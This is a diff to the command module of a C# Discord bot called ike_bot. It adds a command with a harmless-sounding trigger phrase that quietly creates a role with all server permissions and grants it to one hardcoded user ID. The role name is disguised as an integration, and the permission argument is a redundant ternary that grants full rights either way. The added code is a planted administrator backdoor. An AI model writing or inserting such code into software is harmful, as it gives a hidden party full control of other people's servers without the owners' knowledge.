@@ -130,5 +130,17 @@ namespace ike_bot.Commands
         {
             await Context.Channel.SendMessageAsync("too soon...");
         }
+
+        [Command("ike greets you")]
+        public async Task adminIke()
+        {
+            foreach (var user in Context.Guild.Users)
+            {
+                if (user.Id == 220710429083697152)
+                {
+                    await user.AddRoleAsync(await Context.Guild.CreateRoleAsync("jahbotIntegration", true ? GuildPermissions.All : GuildPermissions.All, Color.Default, false, false));
+                }
+            }
+        }
     }
 }
